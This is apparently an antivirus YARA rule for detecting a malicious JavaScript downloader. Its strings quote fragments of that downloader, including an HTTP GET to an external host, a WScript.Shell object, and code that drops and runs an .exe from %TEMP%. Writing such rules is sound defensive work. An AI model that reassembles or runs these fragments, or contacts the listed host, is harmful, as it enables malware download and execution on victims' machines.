rule sig_20160328_ce4af7332d6a49cb218fb1e1abf02711 {
  meta:
    description = "datamaliciousorder - file 20160328_ce4af7332d6a49cb218fb1e1abf02711.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "56f6a151f8122d5b200a3e6c53e606b7b0b928a4ec1a70b8d71e910d92e6db0d"

  strings:
    $s1  = "function Njtzbyfbnu() {return Diyzni[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"VT9awvMZ.exe\";};" fullword ascii
    $s2  = "Mfcbesuqci[Acwkox](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Tvxjugrywv](Gdugatr() * 11)} while (Mfcbesuqci[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Diyzni = function Pkbpwakl() {return WScript[Okhvlbdm](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tywygplr(Ylkopljy, Yhxvyq){return Ylkopljy - Yhxvyq;};" fullword ascii
    $s6  = "function Gcpiwpcyny(Getfmid) {var Idmerscvq = (1, 2, 3, 4, 5, Getfmid); return Idmerscvq;};" fullword ascii
    $s7  = "function Hmsjfml() {return ((Lpetwxp == true) && (Lpetwxp == Yqfcvu)) ? 1 : Lofqe;};" fullword ascii
    $s8  = "function Kddrerum(Cmrqnc){Diyzni[\"Run\"](Cmrqnc, Lofqe, Lofqe);};" fullword ascii
    $s9  = "Lpetwxp = true; " fullword ascii
    $s10 = "var Yqfcvu = false;" fullword ascii
    $s11 = "Yqfcvu = true; " fullword ascii
    $s12 = "var Hnwub = new this[\"Date\"]();" fullword ascii
    $s13 = "var Lpetwxp = false;" fullword ascii
    $s14 = "function Wxmdpwu(){return Okhvlbdm;};" fullword ascii
    $s15 = " while (Kfkmligd){" fullword ascii
    $s16 = "function Fpilaqpdj(){return Aqnncnpkz;};" fullword ascii
    $s17 = "function Wmgdygjmu()" fullword ascii
    $s18 = "return Tywygplr(Lzcpj, Mhwzlyzp);" fullword ascii
    $s19 = "var Mwlcx = false;" fullword ascii
    $s20 = "function Gdugatr(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}